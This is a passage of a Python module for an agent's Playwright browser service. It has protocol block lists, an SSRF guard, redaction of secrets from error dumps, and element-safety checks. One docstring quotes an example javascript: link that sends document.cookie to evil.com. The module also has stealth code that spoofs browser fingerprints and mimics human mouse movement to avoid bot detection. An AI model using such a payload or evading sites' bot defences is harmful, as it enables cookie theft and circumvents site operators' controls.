"""
Browser automation infrastructure with Playwright.

This module provides a defensive, self-healing browser service with:
- Context manager for guaranteed cleanup
- Stealth mode for anti-fingerprinting
- Human-like typing with jitter
- Automatic error snapshots (screenshot + HTML dump)
- Retry mechanism with exponential backoff
- Persistent session support

BATTLE-READY IMPROVEMENTS:
- .first locator strategy as safety fallback for non-unique selectors
- Handles Playwright strict mode violations gracefully
- Falls back to first matching element when selector matches multiple
- Logs warnings when fallback is used for debugging

Why Dependency Injection?
- BrowserService receives Settings via __init__ instead of reading globals
- Makes testing easy: can mock settings without env manipulation
- Explicit dependencies make code easier to understand and refactor
"""

import asyncio
import ipaddress
import logging
import random
import re
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from playwright.async_api import (
    Browser,
    BrowserContext,
    Error as PlaywrightError,
    Page,
    TimeoutError as PlaywrightTimeoutError,
    async_playwright,
)

from ..config import Settings
from ..core.exceptions import BrowserError
from ..core.models import ActionResult

# FIX (4.3 Minor): this module previously had no `import logging` at all -
# every diagnostic (cleanup errors, strict-mode-violation fallback
# warnings, snapshot failures) went through print(), which never reaches
# agent.log (main.py only attaches a FileHandler to the root/module
# loggers, not to stdout prints). Critical post-mortem signals like ".first
# fallback used" were therefore invisible in the log file.
logger = logging.getLogger(__name__)

# Task 4 (stealth mode): playwright-stealth is an OPTIONAL extra
# (requirements-tools.txt), imported lazily exactly once per run - same
# pattern as tiktoken. If the package is unavailable we log one warning
# and continue with the built-in init-script patches below (which cover
# the highest-signal checks on their own); stealth must never be a hard
# dependency.
_stealth_state = {"warned": False}

# Pre-stealth hardcoded UA for the non-persistent context branch - kept so
# ENABLE_STEALTH_MODE=false reproduces the exact pre-Task-4 launch behavior.
_LEGACY_CONTEXT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


async def _stealth_async(page) -> bool:
    """Apply playwright-stealth patches to a page if the optional package is
    installed. Returns True when applied. Never raises."""
    try:
        from playwright_stealth import stealth_async  # noqa: PLC0415 - lazy by design
    except ImportError:
        if not _stealth_state["warned"]:
            _stealth_state["warned"] = True
            logger.warning(
                "playwright-stealth is not installed - using the built-in "
                "stealth init scripts only (install requirements-tools.txt "
                "for the fuller patch set). This warning logs once per run."
            )
        return False
    try:
        await stealth_async(page)
        return True
    except Exception as e:  # noqa: BLE001 - best-effort enhancement only
        logger.warning(f"playwright-stealth apply failed (continuing without it): {e}")
        return False


# FIX (Security Critical): shared list of blocked protocols. Previously only
# navigate() checked this; click_element_safe()/type_text() could be used to
# fully bypass it by clicking a live DOM element whose href/onclick contains
# a javascript:/data: payload.
DANGEROUS_PROTOCOLS = ["javascript:", "data:", "file:", "about:", "chrome:"]

# FIX (Security Major): patterns redacted from HTML error-snapshot dumps.
# _capture_error_snapshot() previously wrote full page.content() + a
# screenshot to disk with zero sanitization on every failed click/type/
# select - including login/payment forms - so csrf tokens, session tokens,
# and password input values could end up sitting in plaintext on disk.
_SENSITIVE_HTML_PATTERNS = [
    # <input type="password" ... value="...">
    (
        re.compile(r'(type=["\']password["\'][^>]*?value=["\'])[^"\']*(["\'])', re.IGNORECASE),
        r"\1[REDACTED]\2",
    ),
    # value="..." ... type="password" (attribute order reversed)
    (
        re.compile(r'(value=["\'])[^"\']*(["\'][^>]*?type=["\']password["\'])', re.IGNORECASE),
        r"\1[REDACTED]\2",
    ),
    # generic csrf/token/session-looking attribute or hidden-field values
    (
        re.compile(
            r'((?:csrf|token|session|api[_-]?key)[^=]{0,20}=["\'])[^"\']{4,}(["\'])', re.IGNORECASE
        ),
        r"\1[REDACTED]\2",
    ),
]


def _redact_sensitive_html(html: str) -> str:
    """Best-effort redaction of obviously sensitive values before writing an
    HTML error dump to disk. Not a substitute for not persisting secrets in
    the first place, but reduces exposure for the common cases (password
    fields, csrf/session tokens)."""
    for pattern, replacement in _SENSITIVE_HTML_PATTERNS:
        html = pattern.sub(replacement, html)
    return html


def _is_dangerous_url(url: str | None) -> str | None:
    """Returns the matched dangerous protocol prefix if `url` uses one of
    DANGEROUS_PROTOCOLS, else None. Shared by navigate() and the
    click/type/select element-safety check so both paths enforce the exact
    same policy."""
    if not url:
        return None
    url_lower = url.strip().lower()
    for protocol in DANGEROUS_PROTOCOLS:
        if url_lower.startswith(protocol):
            return protocol
    return None


def _host_is_allowed(host: str, allowed_domains: list[str] | None) -> bool:
    """Exact (case-insensitive) hostname match against the allowlist.
    Subdomains must be listed explicitly - no wildcard suffix matching,
    so 'evil.com' can never sneak in as 'com.'-suffixed subdomain of a
    broad entry."""
    if not allowed_domains:
        return False
    return host.lower() in {d.lower() for d in allowed_domains}


def _ip_is_private_network(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
    """True for RFC1918 / loopback / link-local / reserved / unspecified
    addresses - the ranges an LLM-driven agent should never wander into
    uninvited (neighbor services, cloud metadata endpoints, etc)."""
    return (
        ip.is_private
        or ip.is_loopback
        or ip.is_link_local
        or ip.is_reserved
        or ip.is_unspecified
        or ip.is_multicast
    )


async def _check_navigation_host_policy(
    url: str, allowed_domains: list[str] | None, block_private_networks: bool
) -> str | None:
    """
    2.4 (SSRF / lateral-movement guard): given a candidate navigation URL,
    return a rejection reason string if the host violates policy, else None.

    Two independent checks:
    1. Domain allowlist (if configured): any host not on the list is
       rejected.
    2. Private-network guard (default ON): resolve the host and reject
       RFC1918/loopback/link-local targets (including 169.254.169.254
       cloud metadata and localhost services in the same container).
       Hosts explicitly present in the allowlist bypass this guard.

    DNS resolution failures do NOT block navigation here - the actual
    page.goto() will produce a clearer, actionable error for the LLM.
    """
    host = urlparse(url).hostname
    if not host:
        return None

    if _host_is_allowed(host, allowed_domains):
        return None

    if allowed_domains is not None:
        return (
            f"Host '{host}' is not in NAVIGATE_ALLOWED_DOMAINS. "
            f"Allowed: {sorted(allowed_domains)}"
        )

    if not block_private_networks:
        return None

    if host.lower() == "localhost":
        return f"Host '{host}' resolves to loopback and is blocked by policy"

    # IP literals need no DNS lookup
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        ip = None

    if ip is None:
        try:
            loop = asyncio.get_running_loop()
            addrinfos = await loop.getaddrinfo(host, None)
            ips = {ipaddress.ip_address(info[4][0]) for info in addrinfos}
        except Exception:
            return None  # resolution failure: let goto() surface the real error
        blocked = [str(a) for a in ips if _ip_is_private_network(a)]
        if blocked:
            return f"Host '{host}' resolves to private/loopback address(es) {blocked}, blocked by policy"
        return None

    if _ip_is_private_network(ip):
        return f"Host '{host}' is a private/loopback address, blocked by policy"

    return None


class BrowserService:
    """
    Async browser automation service with defensive programming patterns.

    This is the heavy lifter of the system. Key design decisions:

    1. Async API: Uses async/await throughout for better concurrency
    2. Context Manager: Guarantees browser cleanup with asyncio.shield()
    3. Retry Logic: Wraps critical operations with exponential backoff
    4. Error Snapshots: Automatically captures diagnostics on failures
    5. Stealth Mode: Masks WebDriver detection when enabled
    6. STRICT MODE HANDLING: Falls back to .first when selector matches multiple

    Why async?
    - Future-proof: can handle multiple pages/browsers concurrently
    - Better resource utilization during waits
    - Required for modern Python practices (async is the default now)
    """

    def __init__(self, settings: Settings):
        """
        Initialize browser service with injected settings.

        Why Dependency Injection here?
        - Settings contains browser configuration (headless, slow_mo, etc.)
        - Easy to test: pass different Settings instances
        - No hidden dependencies on environment or globals

        Args:
            settings: Validated application settings
        """
        self.settings = settings
        self.playwright = None
        self.browser: Browser | None = None
        self.context: BrowserContext | None = None
        self.page: Page | None = None

        # Element mapping for ID-based selectors
        self.element_map: dict[int, str] = {}
        self.next_element_id = 0

    async def new_page(self) -> "BrowserService":
        """
        FIX (1.1b, base for multi-page): open an additional Page in the
        EXISTING BrowserContext and return a lightweight per-page view of
        this service for it - its own independent element_map, so DOM
        observations from one page can never leak selector mappings into
        another. Cookies/storage state are intentionally shared (same
        context), per-page state (element_map, page) is not.

        The returned object shares `settings` and the underlying
        browser/context lifecycle with this one; closing the parent
        service closes everything.
        """
        if self.context is None:
            raise BrowserError("new_page() called before start() - no browser context yet")

        page = await self.context.new_page()
        page.set_default_timeout(self.settings.action_timeout)
        page.set_default_navigation_timeout(self.settings.page_load_timeout)

        view = BrowserService.__new__(BrowserService)
        view.settings = self.settings
        view.playwright = self.playwright
        view.browser = self.browser
        view.context = self.context
        view.page = page
        view.element_map = {}
        view.next_element_id = 0

        # Task 4: context-level init scripts already apply to this page;
        # playwright-stealth however patches per page, so re-apply it.
        if self.settings.enable_stealth_mode:
            await _stealth_async(page)
        return view

    async def __aenter__(self) -> "BrowserService":
        """
        Context manager entry: Initialize browser.

        Why context manager?
        - Guarantees cleanup even if exceptions occur
        - Pythonic resource management
        - Prevents zombie browser processes
        """
        await self.start()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """
        Context manager exit: Cleanup browser.

        Uses asyncio.shield() to ensure cleanup completes even if
        the Python process receives SIGINT/SIGTERM.

        Why shield?
        - Browser cleanup is CRITICAL to prevent zombies
        - Must complete even during cancellation
        - Prevents resource leaks in production
        """
        await asyncio.shield(self.close())
        return False  # Don't suppress exceptions

    async def start(self) -> None:
        """
        Launch browser with stealth and persistence.

        Why separate start() method?
        - Can be called manually if not using context manager
        - Easier to implement retry logic around startup
        - Clear separation of initialization vs. usage

        Task 4 (stealth mode): when enable_stealth_mode is on, the browser
        context gets an internally CONSISTENT profile - UA, locale,
        timezone and viewport all from Settings, plus init scripts that
        remove the usual headless/automation tells (navigator.webdriver,
        empty plugins, WebGL renderer). Consistency matters more than
        "randomness": a mismatched fingerprint is itself a bot signal.

        Raises:
            BrowserError: If browser fails to launch
        """
        try:
            # Launch Playwright
            self.playwright = await async_playwright().start()

            # Task 4: the stealth profile options applied to the context
            # (UA/locale/timezone/viewport must move together, see
            # settings.py). Empty dict = defaults, identical to the
            # pre-stealth behavior. Stealth overrides the base viewport.
            launch_kwargs: dict = {"viewport": {"width": 1920, "height": 1080}}
            launch_kwargs.update(self._stealth_context_options())

            # Launch browser (persistent context for session reuse)
            if self.settings.user_data_dir:
                # Persistent context maintains cookies/localStorage across runs
                self.context = await self.playwright.chromium.launch_persistent_context(
                    user_data_dir=str(self.settings.user_data_dir),
                    headless=self.settings.headless,
                    slow_mo=self.settings.slow_mo,
                    args=[
                        "--disable-blink-features=AutomationControlled",  # Hide WebDriver
                        "--disable-dev-shm-usage",  # Prevent OOM in containers
                        "--no-sandbox",  # Required in Docker
                    ],
                    **launch_kwargs,
                )
                self.page = (
                    self.context.pages[0] if self.context.pages else await self.context.new_page()
                )
            else:
                # Non-persistent mode
                self.browser = await self.playwright.chromium.launch(
                    headless=self.settings.headless,
                    slow_mo=self.settings.slow_mo,
                )
                if not self.settings.enable_stealth_mode:
                    # Pre-stealth behavior: this branch always carried its
                    # own fixed UA. Kept so ENABLE_STEALTH_MODE=false is a
                    # byte-identical regression of the old launch path.
                    launch_kwargs["user_agent"] = _LEGACY_CONTEXT_USER_AGENT
                self.context = await self.browser.new_context(**launch_kwargs)
                self.page = await self.context.new_page()

            # Task 4 (stealth mode): fingerprint init scripts + optional
            # playwright-stealth patches. Init scripts are added on the
            # CONTEXT so every future page (new_page(), popups) gets them
            # automatically.
            if self.settings.enable_stealth_mode:
                await self.context.add_init_script(self._stealth_init_script())
                await _stealth_async(self.page)

            # FIX (3.3, captcha handling - human-in-the-loop scope, L0
            # avoidance): reduces bot-detection signals that commonly
            # trigger a captcha challenge in the first place - randomized,
            # human-like mouse movement and more natural request headers.
            # This is fingerprinting mitigation only; it never attempts to
            # solve or bypass a captcha that is already being shown.
            if self.settings.captcha_avoidance_mode:
                await self._human_mouse_warmup()
                await self.context.set_extra_http_headers(
                    {
                        "Accept-Language": self._accept_language(),
                        "sec-ch-ua-platform": self._sec_ch_ua_platform(),
                    }
                )

            # Set default timeouts
            self.page.set_default_timeout(self.settings.action_timeout)
            self.page.set_default_navigation_timeout(self.settings.page_load_timeout)

        except Exception as e:
            # FIX (3.2 Major, resource leak): if launch() itself succeeded
            # but a later step (new_page(), stealth_async(), etc.) raised,
            # the previous code went straight to `raise BrowserError(...)`
            # without closing whatever was already created. Since
            # __aenter__() is just `await self.start()`, a raised exception
            # here means __aexit__() is NEVER called (that's how `async
            # with` works when __aenter__ itself fails) - so close() would
            # never run either. Net effect: a partially-launched Chromium
            # process became a zombie. We now clean up whatever was created
            # before propagating the error.
            for resource in (self.context, self.browser, self.playwright):
                if resource is None:
                    continue
                try:
                    if resource is self.playwright:
                        await resource.stop()
                    else:
                        await resource.close()
                except Exception as cleanup_error:
                    logger.warning(f"Error cleaning up partial browser resource: {cleanup_error}")
            self.page = None
            self.context = None
            self.browser = None
            self.playwright = None

            raise BrowserError(
                f"Failed to launch browser: {e}",
                context={"settings": self.settings.model_dump(exclude={"api_key"})},
            ) from e

    # ========================================================================
    # Task 4: stealth profile helpers
    # ========================================================================

    def _stealth_context_options(self) -> dict:
        """Context options for the consistent stealth profile. Empty dict
        when stealth is off, so the off-state stays byte-identical to the
        pre-stealth launch behavior."""
        if not self.settings.enable_stealth_mode:
            return {}
        return {
            "user_agent": self.settings.stealth_user_agent,
            "locale": self.settings.stealth_locale,
            "timezone_id": self.settings.stealth_timezone,
            "viewport": {
                "width": self.settings.stealth_viewport_width,
                "height": self.settings.stealth_viewport_height,
            },
        }

    def _stealth_init_script(self) -> str:
        """
        JS init script removing the highest-signal automation tells that
        Playwright/Chromium leave behind in a default session. Runs before
        every page's own scripts (add_init_script semantics), so page JS
        observing navigator/WebGL sees the patched values.

        Values are deliberately CONSISTENT with the context profile
        (locale/languages) and with the Windows-Chrome UA default - see
        the "рассинхронизация фингерпринта" note in settings.py.
        """
        languages = f'["{self.settings.stealth_locale}", "{self.settings.stealth_locale.split("-")[0]}", "en"]'
        return f"""
            Object.defineProperty(navigator, 'webdriver', {{get: () => undefined}});
            if (!window.chrome) {{ window.chrome = {{ runtime: {{}} }}; }}
            Object.defineProperty(navigator, 'languages', {{get: () => {languages}}});
            Object.defineProperty(navigator, 'plugins', {{
                get: () => [
                    {{name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer',
                      description: 'Portable Document Format files'}},
                    {{name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer',
                      description: 'Portable Document Format files'}},
                    {{name: 'Microsoft Edge PDF Viewer', filename: 'internal-pdf-viewer',
                      description: 'Portable Document Format files'}},
                ]
            }});
            Object.defineProperty(navigator, 'mimeTypes', {{
                get: () => [
                    {{type: 'application/pdf', suffixes: 'pdf'}},
                    {{type: 'text/pdf', suffixes: 'pdf'}},
                ]
            }});
            try {{
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {{
                    if (parameter === 37445) return 'Google Inc. (Intel)';
                    if (parameter === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.1)';
                    return getParameter.call(this, parameter);
                }};
            }} catch (e) {{ /* WebGL unavailable - nothing to patch */ }}
        """

    def _accept_language(self) -> str:
        """Accept-Language header consistent with the stealth locale (and
        with navigator.languages patched by the init script)."""
        locale = self.settings.stealth_locale
        lang = locale.split("-")[0]
        return f"{locale},{lang};q=0.9,en;q=0.8"

    def _sec_ch_ua_platform(self) -> str:
        """sec-ch-ua-platform header consistent with the stealth UA."""
        ua = self.settings.stealth_user_agent.lower()
        if "windows" in ua:
            return '"Windows"'
        if "mac" in ua or "os x" in ua:
            return '"macOS"'
        return '"Linux"'

    async def _human_pause(self) -> None:
        """Task 4: small random pause before an interaction. Reuses the
        bandit-accepted `random` source already used for typing delays -
        no new randomness source is introduced."""
        if self.settings.enable_stealth_mode:
            await asyncio.sleep(random.uniform(0.05, 0.2))

    async def _human_move_to_element(self, locator) -> None:
        """
        Task 4: move the mouse to the element through a few intermediate
        points with slight jitter before clicking - a perfectly straight,
        instant jump to exact coordinates is a classic bot tell. Best
        effort: on any failure (no bounding box, detached element) the
        caller proceeds with a normal click.
        """
        try:
            box = await locator.bounding_box()
            if not isinstance(box, dict):
                return
            target_x = box["x"] + box["width"] / 2
            target_y = box["y"] + box["height"] / 2
            steps = random.randint(3, 6)
            for i in range(1, steps + 1):
                # Slightly-perpendicular jitter shrinks as we approach.
                progress = i / steps
                jitter = (1 - progress) * random.uniform(-40, 40)
                await self.page.mouse.move(
                    target_x * progress + jitter,
                    target_y * progress - jitter,
                )
            await self.page.mouse.move(target_x, target_y)
        except Exception as e:
            logger.debug(f"Human-like mouse move skipped (non-fatal): {e}")

    async def _human_mouse_warmup(self) -> None:
        """
        FIX (3.3, captcha handling - L0 avoidance): perform a few small,
        randomized mouse movements right after launch, before any real
        interaction with a page. Some bot-detection heuristics flag
        sessions whose very first pointer event is a precise click with no
        prior movement at all - this makes the session's early mouse
        trajectory look at least superficially human.

        Deliberately NOT trying to defeat or solve an active captcha
        challenge - this only runs once, at startup, to reduce the chance
        one is shown in the first place. If it fails for any reason (e.g.
        no page yet), that's non-fatal; captcha avoidance is a best-effort
        nice-to-have, never a hard requirement for the agent to function.
        """
        if not self.page:
            return
        try:
            viewport = self.page.viewport_size or {"width": 1920, "height": 1080}
            width, height = viewport["width"], viewport["height"]
            steps = random.randint(2, 5)
            for _ in range(steps):
                x = random.uniform(0, width)
                y = random.uniform(0, height)
                await self.page.mouse.move(x, y)
                await asyncio.sleep(random.uniform(0.1, 0.3))
        except Exception as e:
            logger.debug(f"Mouse warmup skipped (non-fatal): {e}")

    async def close(self) -> None:
        """
        Gracefully shutdown browser.

        Why separate close() method?
        - Can be called manually for cleanup
        - Used by context manager __aexit__
        - Centralizes cleanup logic
        """
        try:
            if self.page:
                await self.page.close()
            if self.context:
                await self.context.close()
            if self.browser:
                await self.browser.close()
            if self.playwright:
                await self.playwright.stop()
        except Exception as e:
            # Log but don't raise - cleanup should never fail
            logger.warning(f"Warning during browser cleanup: {e}")
        finally:
            self.page = None
            self.context = None
            self.browser = None
            self.playwright = None

    async def navigate(self, url: str) -> ActionResult:
        """
        Navigate to URL with validation, retry and error handling.

        Why URL validation?
        - Prevents javascript: and data: URL injections
        - Blocks file:// protocol access
        - Ensures only HTTP/HTTPS navigation

        Why retry logic?
        - Network flakiness is common
        - Exponential backoff prevents overwhelming servers
        - Automatic recovery from transient failures

        Args:
            url: Target URL

        Returns:
            ActionResult with success status
        """
        # FIX (2.3 Critical): args: Dict[str, Any] does not enforce value
        # types, so {"tool": "navigate", "args": {"url": 12345}} passed
        # Pydantic validation and reached here, where the old code's very
        # first line - `if not url or not url.strip()` - raised an
        # unhandled AttributeError ('int' object has no attribute 'strip')
        # BEFORE the try/except block below that catches network errors.
        # That exception was not caught anywhere in orchestrator.run() and
        # killed the whole task. Type-check explicitly and fail soft.
        if not isinstance(url, str):
            return ActionResult(
                success=False,
                message=f"navigate requires a string url, got {type(url).__name__}",
                error="InvalidType",
            )

        # URL validation - security critical
        if not url or not url.strip():
            return ActionResult(success=False, message="URL cannot be empty", error="InvalidURL")

        url = url.strip()

        # Block dangerous protocols
        blocked = _is_dangerous_url(url)
        if blocked:
            return ActionResult(
                success=False,
                message=f"Protocol '{blocked}' not allowed for security reasons",
                error="BlockedProtocol",
            )

        # Ensure HTTP/HTTPS
        url_lower = url.lower()
        if not (url_lower.startswith("http://") or url_lower.startswith("https://")):
            # Auto-add https:// if missing
            url = f"https://{url}"

        # 2.4: host-level policy check BEFORE any network navigation.
        # Returns ActionResult (not an exception) so the LLM gets readable
        # feedback in its next observation and can continue the task.
        policy_violation = await _check_navigation_host_policy(
            url,
            self.settings.navigate_allowed_domains,
            self.settings.navigate_block_private_networks,
        )
        if policy_violation:
            return ActionResult(
                success=False,
                message=f"Navigation blocked by policy: {policy_violation}",
                error="BlockedByPolicy",
            )

        max_retries = 3
        for attempt in range(max_retries):
            try:
                await self.page.goto(url, wait_until="domcontentloaded")

                # FIX (Security Major, defense-in-depth): the original code
                # only validated the URL passed in by the agent, never the
                # URL the page actually ended up at after redirects
                # (meta-refresh, window.location, server redirect chains).
                # Modern Chromium blocks most unsafe scheme-downgrade
                # redirects on its own, but re-checking here costs nothing
                # and catches any that slip through.
                final_blocked = _is_dangerous_url(self.page.url)
                if final_blocked:
                    return ActionResult(
                        success=False,
                        message=f"Navigation redirected to blocked protocol '{final_blocked}'",
                        error="BlockedProtocol",
                    )

                # Defense-in-depth (DNS rebinding / redirect chains): the
                # pre-flight policy check resolved the ORIGINAL url's host
                # before goto(); a redirect chain may have landed the page
                # on a different host that was never checked at all. Re-run
                # the same host policy against the final URL. (A full
                # rebinding defense would need to pin the resolved IP for
                # the connection itself - this closes the redirect gap,
                # not the TOCTOU between Python's resolver and Chromium's.)
                final_violation = await _check_navigation_host_policy(
                    self.page.url,
                    self.settings.navigate_allowed_domains,
                    self.settings.navigate_block_private_networks,
                )
                if final_violation:
                    return ActionResult(
                        success=False,
                        message=(
                            "Navigation redirected to a host blocked by "
                            f"policy: {final_violation}"
                        ),
                        error="BlockedByPolicy",
                    )

                # Wait for page to stabilize
                await self.page.wait_for_load_state("networkidle", timeout=10000)

                return ActionResult(success=True, message=f"Navigated to {url}")

            except PlaywrightTimeoutError:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2**attempt)  # Exponential backoff
                    continue
                else:
                    # FIX (Docs vs Code Drift #6): _capture_error_snapshot()
                    # was called from click/type/select on failure, but
                    # never from navigate() - meaning the single most common
                    # class of web-automation failure (navigation timeouts,
                    # DNS errors, connection resets) produced NO diagnostic
                    # screenshot/HTML dump, contradicting README's "Error
                    # Recovery: автоматические снимки при сбоях" claim.
                    await self._capture_error_snapshot("navigation_timeout")
                    return ActionResult(
                        success=False,
                        message=f"Navigation timeout after {max_retries} attempts",
                        error="NavigationTimeout",
                    )

            except Exception as e:
                await self._capture_error_snapshot("navigation_error")
                return ActionResult(success=False, message=f"Navigation failed: {e}", error=str(e))

    async def _check_element_safety(self, selector: str) -> str | None:
        """
        Returns an error message if the live element behind `selector` is
        unsafe to interact with (dangerous href/protocol), else None.

        FIX (Security Critical): navigate() filtered dangerous_protocols
        for explicit URLs passed by the agent, but click_element_safe()/
        type_text()/select_option() called self.page.click()/etc. directly
        on a live DOM element with no check on its href/onclick at all. A
        page under attacker control could place a real, visible
        <a href="javascript:fetch('https://evil.com?c='+document.cookie)">
        and the click would execute it - completely bypassing navigate()'s
        guard, which sits on a different code path entirely.

        Defense-in-depth (element attributes beyond href): onclick and
        formaction are checked too. `<button onclick="location=
        'javascript:...'">` and `<button formaction="javascript:...">`
        execute script on interaction just like a javascript: href, so a
        check limited to href was trivially bypassable.
        """
        locator = self.page.locator(selector).first
        href = onclick = formaction = None
        try:
            href = await locator.get_attribute("href")
        except Exception:
            href = None
        try:
            onclick = await locator.get_attribute("onclick")
        except Exception:
            onclick = None
        try:
            formaction = await locator.get_attribute("formaction")
        except Exception:
            formaction = None

        blocked = _is_dangerous_url(href) or _is_dangerous_url(formaction)
        if blocked:
            return f"Element href/formaction uses blocked protocol '{blocked}'"

        # onclick is a JS handler body, not a URL - _is_dangerous_url's
        # prefix check does not apply. Any 'javascript:' payload anywhere
        # in the handler is enough to refuse the interaction.
        if onclick and "javascript:" in onclick.lower():
            return "Element onclick handler contains a 'javascript:' payload"
        return None

    # FIX (Task 2 - generalize beyond hh.ru): common cookie-consent / GDPR
    # overlay dismiss targets. Deliberately generic (text-based phrases in
    # several languages + a couple of very widely-used vendor markup IDs),
    # not tuned to any one site. Used as one level of the click
    # degradation ladder below when a click looks like it's being blocked
    # by something covering the target element.
    _OVERLAY_DISMISS_SELECTORS = [
        "#onetrust-accept-btn-handler",
        "[id*='cookie' i] button:has-text('Accept')",
        "button:has-text('Accept all')",
        "button:has-text('Accept All')",
        "button:has-text('Accept')",
        "button:has-text('I agree')",
        "button:has-text('Agree')",
        "button:has-text('Got it')",
        "button:has-text('Согласен')",
        "button:has-text('Принять')",
        "[aria-label='Accept cookies']",
        "[aria-label='Close']",
    ]

    async def _try_dismiss_overlay(self) -> bool:
        """
        TASK 2: best-effort attempt to close a common cookie-consent/modal
        overlay that might be intercepting clicks on the real target
        element. Deliberately conservative - only clicks a handful of
        widely-recognized, generic accept/close targets, never guesses at
        site-specific markup. Returns True if something was dismissed.
        """
        for sel in self._OVERLAY_DISMISS_SELECTORS:
            try:
                locator = self.page.locator(sel).first
                if await locator.is_visible(timeout=500):
                    await locator.click(timeout=1500)
                    logger.info(f"Dismissed a likely blocking overlay via: {sel}")
                    await asyncio.sleep(0.3)
                    return True
            except Exception:
                continue
        return False

    async def click_element_safe(self, element_id: int) -> ActionResult:
        """
        Click element with multiple levels of graceful degradation.

        BATTLE-READY CLICKING:
        - Handles Playwright strict mode violations (.first fallback)
        - Detects and dismisses a likely blocking overlay (cookie banner,
          modal) before retrying, instead of giving up immediately
        - Falls back to a forced click (bypasses actionability checks) for
          elements that are technically visible but briefly unstable
          (mid-animation) or partially covered
        - Falls back further to a raw JS click-event dispatch as a last
          resort, for elements a forced click still can't reach
        - Still waits for visibility and scrolls into view on the primary
          path

        FIX (Task 2 - generalize beyond hh.ru): the previous version had
        exactly one fallback (.first, for non-unique selectors). Real
        sites fail clicks for several other common reasons unrelated to
        selector uniqueness - a cookie-consent overlay sitting on top of
        the target, a CSS transition making the element briefly
        non-stable, or "element intercepts pointer events" because
        something else (even at zero opacity) covers it. Each is now its
        own degradation level, tried in order from least to most invasive,
        stopping at the first one that actually clicks the element.

        Why defensive clicking?
        - Elements might not be ready immediately after page load
        - Prevents "element not interactable" errors
        - Waits for element to be in stable state
        - Gracefully handles non-unique selectors and real-world overlays

        Args:
            element_id: Internal element ID from element_map

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found in element map",
                error="InvalidElementID",
            )

        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        max_retries = 3
        warning: str | None = None
        last_error: Exception | None = None
        overlay_dismiss_attempted = False

        for attempt in range(max_retries):
            try:
                # Wait for element to be visible and enabled
                await self.page.wait_for_selector(
                    selector, state="visible", timeout=self.settings.action_timeout
                )

                locator = self.page.locator(selector)

                try:
                    # Scroll into view
                    await locator.scroll_into_view_if_needed()

                    # Small delay for animations
                    await asyncio.sleep(0.3)

                    # Task 4 (stealth): human-like pointer approach - a
                    # small pause plus a jittered multi-point mouse
                    # trajectory to the element before the click itself.
                    if self.settings.enable_stealth_mode:
                        await self._human_pause()
                        await self._human_move_to_element(locator)

                    # Click with strict mode
                    await self.page.click(selector)

                    return ActionResult(
                        success=True, message=f"Clicked element {element_id}", warning=warning
                    )

                except PlaywrightError as click_error:
                    error_text = str(click_error).lower()
                    last_error = click_error

                    # DEGRADATION LEVEL 1: strict mode violation (selector
                    # matched more than one element) -> use .first.
                    if "strict mode violation" in error_text:
                        logger.warning(
                            f"Selector '{selector}' matched multiple elements. Using .first fallback."
                        )
                        first_locator = locator.first
                        await first_locator.scroll_into_view_if_needed()
                        await asyncio.sleep(0.3)
                        await first_locator.click()

                        return ActionResult(
                            success=True,
                            message=f"Clicked element {element_id} (used .first fallback)",
                            warning="Selector matched multiple elements",
                        )

                    # DEGRADATION LEVEL 2: something is covering the
                    # element (overlay/modal/cookie banner) or it's not yet
                    # stable (mid-animation). Try dismissing a known-common
                    # overlay once, then retry from the top of the loop.
                    is_intercepted = (
                        "intercept" in error_text
                        or "obscures" in error_text
                        or "not stable" in error_text
                        or "outside of the viewport" in error_text
                    )
                    if is_intercepted and not overlay_dismiss_attempted:
                        overlay_dismiss_attempted = True
                        dismissed = await self._try_dismiss_overlay()
                        if dismissed:
                            warning = "Dismissed a likely blocking overlay before clicking"
                            continue  # retry from the top with the overlay gone

                    # DEGRADATION LEVEL 3: still blocked (no overlay found,
                    # or dismissing it didn't help). Try a forced click,
                    # which bypasses Playwright's actionability checks -
                    # appropriate for elements that are covered by
                    # something harmless (e.g. a 1px decorative layer) or
                    # still mid-animation.
                    if is_intercepted:
                        try:
                            await locator.click(timeout=self.settings.action_timeout, force=True)
                            return ActionResult(
                                success=True,
                                message=f"Clicked element {element_id} (forced click)",
                                warning="Used force=True - element may have been covered or animating",
                            )
                        except Exception as force_error:
                            last_error = force_error

                        # DEGRADATION LEVEL 4 (last resort): dispatch a raw
                        # click event via JS. Bypasses Playwright's
                        # hit-testing entirely, for elements a forced click
                        # still can't reach.
                        try:
                            await locator.dispatch_event("click")
                            return ActionResult(
                                success=True,
                                message=f"Clicked element {element_id} (JS click-event dispatch)",
                                warning="Used raw click-event dispatch - visual click semantics may differ",
                            )
                        except Exception as dispatch_error:
                            last_error = dispatch_error

                    # Not a recognized/recoverable pattern - re-raise so
                    # the outer except/timeout handling below takes over.
                    raise

            except PlaywrightTimeoutError as timeout_error:
                last_error = timeout_error
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                else:
                    await self._capture_error_snapshot("click_timeout")
                    return ActionResult(
                        success=False,
                        message=f"Element {element_id} not found or not clickable",
                        error="ElementNotFound",
                    )

            except Exception as e:
                last_error = e
                if attempt < max_retries - 1:
                    continue
                await self._capture_error_snapshot("click_error")
                return ActionResult(success=False, message=f"Click failed: {e}", error=str(e))

        await self._capture_error_snapshot("click_error")
        return ActionResult(
            success=False,
            message=f"Click failed after exhausting fallback strategies: {last_error}",
            error=str(last_error) if last_error else "ClickFailed",
        )

    async def type_text(
        self, element_id: int, text: str, press_enter: bool = False
    ) -> ActionResult:
        """
        Type text with human-like delays (anti-fingerprinting).

        BATTLE-READY TYPING:
        - Handles non-unique selectors with .first fallback
        - Focuses element before typing
        - Human-like delays between keystrokes

        Why random delays?
